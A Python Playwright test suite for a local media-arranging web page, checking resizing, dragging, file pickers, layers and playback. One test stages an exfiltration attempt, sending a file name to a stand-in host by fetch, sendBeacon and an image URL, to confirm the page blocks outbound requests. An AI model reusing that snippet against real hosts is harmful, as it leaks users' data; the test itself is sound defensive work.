"""Resize, drag, file picking, and playback checks in Chromium.

Run from the repository root:

    pip install -r tests/requirements.txt
    python3 -m unittest tests.test_resize_browser

Uses Google Chrome when it is installed, otherwise Playwright's Chromium.
"""

import shutil
import struct
import subprocess
import tempfile
import unittest
import zlib
from pathlib import Path

from playwright.sync_api import sync_playwright

ROOT = Path(__file__).resolve().parents[1]
INDEX = ROOT / "index.html"


def write_png(path, width, height, rgb):
    def chunk(tag, data):
        return (
            struct.pack(">I", len(data))
            + tag
            + data
            + struct.pack(">I", zlib.crc32(tag + data) & 0xFFFFFFFF)
        )

    raw = b"".join(b"\x00" + bytes(rgb) * width for _ in range(height))
    ihdr = struct.pack(">IIBBBBB", width, height, 8, 2, 0, 0, 0)
    png = (
        b"\x89PNG\r\n\x1a\n"
        + chunk(b"IHDR", ihdr)
        + chunk(b"IDAT", zlib.compress(raw))
        + chunk(b"IEND", b"")
    )
    path.write_bytes(png)


def write_pdf(path):
    path.write_bytes(
        b"%PDF-1.1\n"
        b"1 0 obj<< /Type /Catalog /Pages 2 0 R >>endobj\n"
        b"2 0 obj<< /Type /Pages /Count 1 /Kids [3 0 R] >>endobj\n"
        b"3 0 obj<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] >>endobj\n"
        b"trailer<< /Root 1 0 R >>\n%%EOF\n"
    )


class ResizeBrowserTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls._tmpdir = tempfile.TemporaryDirectory()
        tmp = Path(cls._tmpdir.name)
        cls.png = tmp / "red.png"
        cls.text = tmp / "note.txt"
        cls.pdf = tmp / "page.pdf"
        cls.mp4 = tmp / "clip.mp4"
        cls.wav = tmp / "tone.wav"
        write_png(cls.png, 120, 80, (220, 30, 30))
        cls.text.write_text("local file host note\nsecond line\n", encoding="utf-8")
        write_pdf(cls.pdf)
        ffmpeg = shutil.which("ffmpeg")
        if not ffmpeg:
            raise unittest.SkipTest("ffmpeg is required to build media fixtures")
        subprocess.run(
            [
                ffmpeg, "-y", "-loglevel", "error",
                "-f", "lavfi", "-i", "color=c=blue:s=160x90:d=1",
                "-f", "lavfi", "-i", "sine=f=880:duration=1",
                "-shortest", "-c:v", "libx264", "-pix_fmt", "yuv420p",
                "-c:a", "aac", str(cls.mp4),
            ],
            check=True,
        )
        subprocess.run(
            [
                ffmpeg, "-y", "-loglevel", "error",
                "-f", "lavfi", "-i", "sine=f=440:duration=1",
                str(cls.wav),
            ],
            check=True,
        )
        cls._playwright = sync_playwright().start()
        launch_args = ["--no-sandbox", "--autoplay-policy=no-user-gesture-required"]
        try:
            cls._browser = cls._playwright.chromium.launch(
                channel="chrome",
                headless=True,
                args=launch_args,
            )
            cls.browser_name = "google-chrome"
        except Exception:
            cls._browser = cls._playwright.chromium.launch(
                headless=True,
                args=launch_args,
            )
            cls.browser_name = "playwright-chromium"

    @classmethod
    def tearDownClass(cls):
        browser = getattr(cls, "_browser", None)
        if browser is not None:
            browser.close()
        playwright = getattr(cls, "_playwright", None)
        if playwright is not None:
            playwright.stop()
        tmp = getattr(cls, "_tmpdir", None)
        if tmp is not None:
            tmp.cleanup()

    def setUp(self):
        self.page = self._browser.new_page(viewport={"width": 1400, "height": 1200})
        self.errors = []
        self.http_requests = []
        self.page.on("pageerror", lambda err: self.errors.append(str(err)))
        self.page.on("request", self.record_request)
        self.page.goto(INDEX.resolve().as_uri())

    def record_request(self, request):
        url = request.url
        if url.startswith(("http://", "https://", "ws://", "wss://")):
            self.http_requests.append(url)

    def tearDown(self):
        outbound = list(self.http_requests)
        self.page.close()
        self.assertEqual(outbound, [])
        self.assertEqual(self.errors, [])

    def metrics(self, index=0):
        return self.page.evaluate(
            """(index) => {
                const el = document.querySelectorAll('.media-element')[index];
                return {
                    left: parseFloat(el.style.left),
                    top: parseFloat(el.style.top),
                    width: parseFloat(el.style.width),
                    height: parseFloat(el.style.height),
                    handles: el.querySelectorAll('.resize-handle').length,
                    kind: el.dataset.kind,
                    selected: el.classList.contains('selected')
                };
            }""",
            index,
        )

    def drag(self, selector, dx, dy, shift=False):
        handle = self.page.locator(selector)
        handle.scroll_into_view_if_needed()
        box = handle.bounding_box()
        self.assertIsNotNone(box)
        x = box["x"] + box["width"] / 2
        y = box["y"] + box["height"] / 2
        if shift:
            self.page.keyboard.down("Shift")
        try:
            self.page.mouse.move(x, y)
            self.page.mouse.down()
            self.page.mouse.move(x + dx, y + dy, steps=8)
            self.page.mouse.up()
        finally:
            if shift:
                self.page.keyboard.up("Shift")

    def assertClose(self, actual, expected, delta=1.5):
        self.assertAlmostEqual(actual, expected, delta=delta)

    def wait_until(self, expression, timeout_ms=5000):
        # page.wait_for_function evaluates in the page and is blocked by the
        # page CSP. Poll from Playwright's isolated world instead.
        elapsed = 0
        while elapsed <= timeout_ms:
            if self.page.evaluate(f"() => Boolean({expression})"):
                return
            self.page.wait_for_timeout(50)
            elapsed += 50
        self.fail("timed out waiting for " + expression)

    def test_corner_handles_are_visible_on_the_corners(self):
        self.page.evaluate("addText()")
        item = self.page.locator(".media-element").bounding_box()
        self.assertEqual(self.metrics()["handles"], 4)
        style = self.page.evaluate(
            """() => {
                const handle = document.querySelector('.resize-handle.se');
                const computed = getComputedStyle(handle);
                return {
                    background: computed.backgroundColor,
                    display: computed.display,
                    visibility: computed.visibility,
                    opacity: computed.opacity
                };
            }"""
        )
        self.assertEqual(style["display"], "block")
        self.assertEqual(style["visibility"], "visible")
        self.assertNotEqual(style["opacity"], "0")
        self.assertIn("255, 255, 255", style["background"])
        expected = {
            "nw": (item["x"], item["y"]),
            "ne": (item["x"] + item["width"], item["y"]),
            "sw": (item["x"], item["y"] + item["height"]),
            "se": (item["x"] + item["width"], item["y"] + item["height"]),
        }
        for corner, (cx, cy) in expected.items():
            box = self.page.locator(f".resize-handle.{corner}").bounding_box()
            self.assertGreaterEqual(box["width"], 10)
            self.assertGreaterEqual(box["height"], 10)
            self.assertClose(box["x"] + box["width"] / 2, cx, delta=3)
            self.assertClose(box["y"] + box["height"] / 2, cy, delta=3)

    def test_each_corner_resizes_without_translating_the_item(self):
        self.page.evaluate("addText()")
        start = self.metrics()
        self.assertEqual(start["width"], 200)
        self.assertEqual(start["height"], 150)

        cases = (
            ("se", 80, 50, False, False),
            ("ne", 40, -30, False, True),
            ("sw", -36, 24, True, False),
            ("nw", -30, -20, True, True),
        )
        for corner, dx, dy, anchor_right, anchor_bottom in cases:
            # Park the item away from the canvas edges so each corner has
            # room to grow. A handle stops at the canvas rather than
            # pushing the opposite edge along with it.
            self.page.evaluate(
                """() => {
                    clearScene();
                    addText();
                    const el = document.querySelector('.media-element');
                    el.style.left = '180px';
                    el.style.top = '140px';
                    el.style.width = '200px';
                    el.style.height = '150px';
                }"""
            )
            before = self.metrics()
            right = before["left"] + before["width"]
            bottom = before["top"] + before["height"]
            self.drag(f".resize-handle.{corner}", dx, dy)
            after = self.metrics()
            grown_w = abs(dx)
            grown_h = abs(dy)
            self.assertClose(after["width"], before["width"] + grown_w)
            self.assertClose(after["height"], before["height"] + grown_h)
            if anchor_right:
                self.assertClose(after["left"] + after["width"], right)
            else:
                self.assertClose(after["left"], before["left"])
            if anchor_bottom:
                self.assertClose(after["top"] + after["height"], bottom)
            else:
                self.assertClose(after["top"], before["top"])
            self.assertTrue(after["selected"])

    def test_resize_gesture_does_not_keep_moving_after_release(self):
        self.page.evaluate("addText()")
        self.drag(".resize-handle.se", 60, 40)
        resized = self.metrics()
        handle = self.page.locator(".resize-handle.se").bounding_box()
        self.page.mouse.move(handle["x"] + 120, handle["y"] + 90, steps=4)
        self.assertEqual(self.metrics(), resized)

    def test_body_drag_moves_and_does_not_resize(self):
        self.page.evaluate("addText()")
        before = self.metrics()
        item = self.page.locator(".media-element")
        box = item.bounding_box()
        x = box["x"] + box["width"] / 2
        y = box["y"] + box["height"] / 2
        self.page.mouse.move(x, y)
        self.page.mouse.down()
        self.page.mouse.move(x + 45, y + 25, steps=6)
        self.page.mouse.up()
        after = self.metrics()
        self.assertClose(after["width"], before["width"])
        self.assertClose(after["height"], before["height"])
        self.assertClose(after["left"], before["left"] + 45)
        self.assertClose(after["top"], before["top"] + 25)

    def test_shift_locks_aspect_ratio(self):
        self.page.evaluate("addText()")
        self.page.evaluate(
            """() => {
                const el = document.querySelector('.media-element');
                el.style.width = '200px';
                el.style.height = '100px';
            }"""
        )
        before = self.metrics()
        self.drag(".resize-handle.se", 100, 10, shift=True)
        after = self.metrics()
        self.assertClose(after["left"], before["left"])
        self.assertClose(after["top"], before["top"])
        self.assertGreater(after["width"], before["width"] + 50)
        self.assertClose(after["height"], after["width"] / 2, delta=2)

    def test_minimum_size_and_canvas_edge(self):
        self.page.evaluate("addText()")
        before = self.metrics()
        self.drag(".resize-handle.se", -400, -400)
        shrunk = self.metrics()
        self.assertEqual(shrunk["width"], 80)
        self.assertEqual(shrunk["height"], 48)
        self.assertClose(shrunk["left"], before["left"])
        self.assertClose(shrunk["top"], before["top"])

        self.page.evaluate("clearScene(); addText()")
        before_grow = self.metrics()
        self.drag(".resize-handle.se", 750, 200)
        grown = self.metrics()
        self.assertClose(grown["width"], before_grow["width"] + 750)
        self.assertClose(grown["height"], before_grow["height"] + 200)
        self.assertGreater(grown["left"] + grown["width"], 800)
        self.assertClose(grown["left"], before_grow["left"])
        self.assertClose(grown["top"], before_grow["top"])

        self.page.evaluate(
            """() => {
                clearScene();
                addText();
                const el = document.querySelector('.media-element');
                el.style.left = '30px';
                el.style.top = '20px';
                el.style.width = '200px';
                el.style.height = '150px';
            }"""
        )
        anchored = self.page.evaluate(
            """() => {
                const el = document.querySelector('.media-element');
                return {
                    right: el.offsetLeft + el.offsetWidth,
                    bottom: el.offsetTop + el.offsetHeight
                };
            }"""
        )
        self.drag(".resize-handle.nw", -200, -200)
        nw = self.metrics()
        border = self.page.evaluate(
            """() => {
                const el = document.querySelector('.media-element');
                return {
                    x: el.offsetWidth - el.clientWidth,
                    y: el.offsetHeight - el.clientHeight,
                    right: el.offsetLeft + el.offsetWidth,
                    bottom: el.offsetTop + el.offsetHeight
                };
            }"""
        )
        self.assertLess(nw["left"], 0)
        self.assertLess(nw["top"], 0)
        self.assertClose(nw["width"], 400)
        self.assertClose(nw["height"], 350)
        self.assertEqual(border["right"], anchored["right"])
        self.assertEqual(border["bottom"], anchored["bottom"])

    def test_image_video_audio_pdf_and_text_get_handles(self):
        self.page.locator("#fileInput").set_input_files(str(self.png))
        self.page.wait_for_selector(".media-element img")
        image = self.metrics()
        self.assertEqual(image["kind"], "image")
        self.assertEqual(image["handles"], 4)
        self.assertEqual(image["width"], 120)
        self.assertEqual(image["height"], 80)
        natural = self.page.evaluate(
            "() => { const img = document.querySelector('img'); return [img.naturalWidth, img.naturalHeight, img.complete]; }"
        )
        self.assertEqual(natural, [120, 80, True])

        self.page.evaluate("clearScene()")
        self.page.locator("#fileInput").set_input_files(str(self.mp4))
        self.page.wait_for_selector(".media-element video")
        video = self.metrics()
        self.assertEqual(video["kind"], "video")
        self.assertEqual(video["handles"], 4)
        self.assertTrue(self.page.evaluate("() => document.querySelector('video').controls"))
        self.page.evaluate("() => document.querySelector('video').play()")
        self.wait_until("document.querySelector('video').currentTime > 0")

        self.page.evaluate("clearScene()")
        self.page.locator("#fileInput").set_input_files(str(self.wav))
        self.page.wait_for_selector(".media-element audio")
        audio = self.metrics()
        self.assertEqual(audio["kind"], "audio")
        self.assertEqual(audio["handles"], 4)
        self.page.evaluate("() => document.querySelector('audio').play()")
        self.wait_until("document.querySelector('audio').currentTime > 0")

        self.page.evaluate("clearScene()")
        self.page.locator("#fileInput").set_input_files(str(self.text))
        self.page.wait_for_selector(".media-element pre")
        text = self.metrics()
        self.assertEqual(text["kind"], "text")
        self.assertEqual(text["handles"], 4)
        self.assertIn(
            "local file host note",
            self.page.locator(".media-element pre").inner_text(),
        )

        self.page.evaluate("clearScene()")
        self.page.locator("#fileInput").set_input_files(str(self.pdf))
        self.page.wait_for_selector(".media-element iframe")
        pdf = self.metrics()
        self.assertEqual(pdf["kind"], "pdf")
        self.assertEqual(pdf["handles"], 4)
        self.assertTrue(
            self.page.evaluate("() => document.querySelector('iframe').src.startsWith('blob:')")
        )

    def test_drop_zone_file_chooser_and_resize_still_share_one_item(self):
        with self.page.expect_file_chooser() as chooser:
            self.page.locator("#fileDropZone").click()
        chooser.value.set_files(str(self.png))
        self.page.wait_for_selector(".media-element img")
        before = self.metrics()
        self.drag(".media-element .resize-handle.se", 30, 20)
        after = self.metrics()
        self.assertClose(after["width"], before["width"] + 30)
        self.assertClose(after["height"], before["height"] + 20)
        self.assertClose(after["left"], before["left"])
        self.assertClose(after["top"], before["top"])
        self.assertEqual(self.page.locator("h1").inner_text(), "Local Media Host")

    def test_auto_arrange_keeps_handles_and_drag_still_works_after_resize(self):
        self.page.evaluate("addText(); addText()")
        self.drag(".media-element:nth-child(2) .resize-handle.se", 40, 20)
        first = self.metrics(0)
        self.page.evaluate(
            """() => {
                document.getElementById('gridColumns').value = '2';
                arrangeGrid();
            }"""
        )
        lefts = self.page.evaluate(
            """() => Array.from(document.querySelectorAll('.media-element')).map(el => ({
                left: parseFloat(el.style.left),
                handles: el.querySelectorAll('.resize-handle').length
            }))"""
        )
        self.assertEqual(len(lefts), 2)
        self.assertNotEqual(lefts[0]["left"], lefts[1]["left"])
        self.assertTrue(all(item["handles"] == 4 for item in lefts))
        # The first item was not the one resized before arrange.
        self.assertEqual(first["handles"], 4)
        self.page.evaluate("clearScene()")
        self.assertEqual(self.page.locator(".media-element").count(), 0)

    def test_compute_resize_matches_the_gesture_rules(self):
        se = self.page.evaluate(
            """() => computeResize({
                left: 10, top: 10, width: 200, height: 100,
                borderX: 4, borderY: 4, minW: 48, minH: 48,
                dx: 40, dy: 30, shift: false,
                anchorRight: false, anchorBottom: false,
                sceneW: 800, sceneH: 600
            })"""
        )
        self.assertEqual(se, {"left": 10, "top": 10, "width": 240, "height": 130})

        locked = self.page.evaluate(
            """() => computeResize({
                left: 10, top: 10, width: 200, height: 100,
                borderX: 4, borderY: 4, minW: 48, minH: 48,
                dx: 40, dy: 0, shift: true,
                anchorRight: false, anchorBottom: false,
                sceneW: 800, sceneH: 600
            })"""
        )
        self.assertEqual(locked["width"], 240)
        self.assertEqual(locked["height"], 120)
        self.assertEqual(locked["left"], 10)

        nw = self.page.evaluate(
            """() => computeResize({
                left: 100, top: 80, width: 200, height: 100,
                borderX: 4, borderY: 4, minW: 48, minH: 48,
                dx: 30, dy: 20, shift: false,
                anchorRight: true, anchorBottom: true,
                sceneW: 800, sceneH: 600
            })"""
        )
        self.assertEqual(nw["width"], 230)
        self.assertEqual(nw["height"], 120)
        self.assertEqual(nw["left"] + nw["width"], 100 + 200)
        self.assertEqual(nw["top"] + nw["height"], 80 + 100)

    def test_local_playback_and_filename_are_not_requested(self):
        self.page.locator("#fileInput").set_input_files(str(self.mp4))
        self.page.wait_for_selector(".media-element video")
        self.page.evaluate("() => document.querySelector('video').play()")
        self.wait_until("document.querySelector('video').currentTime > 0")
        secret = "private-clip-name.mp4"
        attempt = self.page.evaluate(
            """async (secret) => {
                const url = 'https://example.invalid/collect?file=' + encodeURIComponent(secret);
                const before = window.__localOnly.blocked;
                let fetchRejected = false;
                try { await fetch(url, { method: 'POST', body: secret }); }
                catch (e) { fetchRejected = true; }
                let beacon = 'threw';
                try { beacon = navigator.sendBeacon(url, secret) ? 'sent' : 'false'; }
                catch (e) { beacon = 'threw'; }
                const img = document.createElement('img');
                img.src = url;
                const blobUrl = URL.createObjectURL(new Blob(['hello'], { type: 'text/plain' }));
                const local = document.createElement('img');
                local.src = blobUrl;
                return {
                    fetchRejected: fetchRejected,
                    beacon: beacon,
                    remoteSrc: img.getAttribute('src'),
                    localAssigned: local.src.indexOf('blob:') === 0,
                    blocked: window.__localOnly.blocked - before
                };
            }""",
            secret,
        )
        self.assertTrue(attempt["fetchRejected"])
        self.assertIn(attempt["beacon"], ("false", "threw"))
        self.assertIn(attempt["remoteSrc"], (None, ""))
        self.assertTrue(attempt["localAssigned"])
        self.assertGreaterEqual(attempt["blocked"], 2)
        self.assertFalse(any(secret in url for url in self.http_requests))
        self.assertEqual(self.http_requests, [])

    def test_add_video_and_add_image_use_the_local_picker(self):
        with self.page.expect_file_chooser() as video_chooser:
            self.page.get_by_role("button", name="Add Video").click()
        self.assertEqual(
            self.page.locator("#fileInput").get_attribute("data-picker-accept"),
            "video/*",
        )
        video_chooser.value.set_files(str(self.mp4))
        self.page.wait_for_selector(".media-element video")
        self.page.evaluate("clearScene()")
        with self.page.expect_file_chooser() as image_chooser:
            self.page.get_by_role("button", name="Add Image").click()
        self.assertEqual(
            self.page.locator("#fileInput").get_attribute("data-picker-accept"),
            "image/*",
        )
        image_chooser.value.set_files(str(self.png))
        self.page.wait_for_selector(".media-element img")
        self.assertEqual(
            self.page.evaluate("() => document.querySelector('img').naturalWidth"),
            120,
        )
        self.assertEqual(self.http_requests, [])

    def test_off_canvas_layers_opacity_and_order(self):
        self.assertEqual(
            self.page.evaluate(
                "() => getComputedStyle(document.getElementById('sceneContainer')).overflow"
            ),
            "hidden",
        )
        self.page.evaluate("addText(); addText()")
        rows = self.page.locator("#layerList button")
        self.assertEqual(rows.count(), 2)
        self.assertNotIn("http", rows.nth(0).inner_text())
        front = self.page.evaluate(
            """() => {
                const items = Array.from(document.querySelectorAll('.media-element'));
                return items.map(el => ({id: el.dataset.layerId, z: Number(el.style.zIndex)}));
            }"""
        )
        self.assertGreater(front[1]["z"], front[0]["z"])
        self.page.locator("#layerList button").first.click()
        self.page.locator("#layerBackward").click()
        swapped = self.page.evaluate(
            """() => Array.from(document.querySelectorAll('.media-element')).map(el => Number(el.style.zIndex))"""
        )
        self.assertGreater(swapped[0], swapped[1])

        self.page.locator(".media-element").first.click()
        self.page.evaluate(
            """() => {
                const input = document.getElementById('opacityInput');
                input.value = '35';
                input.dispatchEvent(new Event('input', { bubbles: true }));
            }"""
        )
        self.assertEqual(
            self.page.evaluate("() => document.querySelector('.media-element.selected').style.opacity"),
            "0.35",
        )

        box = self.page.locator(".media-element.selected").bounding_box()
        x = box["x"] + 30
        y = box["y"] + 30
        self.page.mouse.move(x, y)
        self.page.mouse.down()
        self.page.mouse.move(x - 500, y - 200, steps=8)
        self.page.mouse.up()
        hung = self.metrics()
        self.assertLess(hung["left"], 0)
        self.assertLess(hung["top"], 0)
        self.assertEqual(self.page.locator("#layerList button").count(), 2)
        self.page.evaluate(
            """() => {
                const el = document.querySelector('.media-element.selected');
                el.style.left = '-900px';
                el.style.top = '-700px';
            }"""
        )
        self.page.locator("#layerList button.selected").click()
        self.page.locator("#layerShow").click()
        overlap = self.page.evaluate(
            """() => {
                const el = document.querySelector('.media-element.selected');
                const scene = document.getElementById('sceneContainer');
                return {
                    x: Math.min(el.offsetLeft + el.offsetWidth, scene.clientWidth) - Math.max(el.offsetLeft, 0),
                    y: Math.min(el.offsetTop + el.offsetHeight, scene.clientHeight) - Math.max(el.offsetTop, 0)
                };
            }"""
        )
        self.assertGreaterEqual(overlap["x"], 48)
        self.assertGreaterEqual(overlap["y"], 48)

    def test_drag_keeps_playback_and_transport_toggles_apply_to_new_media(self):
        self.page.locator("#muteAllButton").click()
        self.page.locator("#loopAllButton").click()
        self.assertEqual(self.page.locator("#muteAllButton").get_attribute("aria-pressed"), "true")
        self.assertEqual(self.page.locator("#loopAllButton").inner_text(), "Loop All: On")
        self.page.locator("#fileInput").set_input_files(str(self.mp4))
        self.page.wait_for_selector("video")
        self.assertTrue(self.page.evaluate("() => { const v = document.querySelector('video'); return v.muted && v.loop; }"))
        self.page.locator("#muteAllButton").click()
        self.assertFalse(self.page.evaluate("() => document.querySelector('video').muted"))
        self.page.evaluate(
            """() => {
                const el = document.querySelector('.media-element');
                el.style.width = '480px';
                el.style.height = '270px';
                document.querySelector('video').play();
            }"""
        )
        self.wait_until("document.querySelector('video').currentTime > 0")
        started = self.page.evaluate("() => document.querySelector('video').currentTime")
        box = self.page.locator("video").bounding_box()
        x = box["x"] + box["width"] / 2
        y = box["y"] + 40
        self.page.mouse.move(x, y)
        self.page.mouse.down()
        self.page.mouse.move(x + 90, y + 20, steps=8)
        self.page.mouse.up()
        self.page.wait_for_timeout(50)
        after_drag = self.page.evaluate(
            """() => {
                const v = document.querySelector('video');
                return { paused: v.paused, time: v.currentTime };
            }"""
        )
        self.assertFalse(after_drag["paused"])
        self.assertGreater(after_drag["time"], started)
        self.page.locator("video").hover()
        box = self.page.locator("video").bounding_box()
        self.page.mouse.click(box["x"] + 18, box["y"] + box["height"] - 28)
        self.page.wait_for_timeout(150)
        self.assertTrue(self.page.evaluate("() => document.querySelector('video').paused"))

        self.page.locator("#fileInput").set_input_files(str(self.wav))
        self.page.wait_for_selector("audio")
        transport = self.page.evaluate(
            """() => {
                const audio = document.querySelector('audio');
                const video = document.querySelector('video');
                return { audioLoop: audio.loop, audioMuted: audio.muted, videoLoop: video.loop };
            }"""
        )
        self.assertTrue(transport["audioLoop"])
        self.assertTrue(transport["videoLoop"])
        self.assertFalse(transport["audioMuted"])
        self.assertEqual(self.http_requests, [])


if __name__ == "__main__":
    unittest.main()
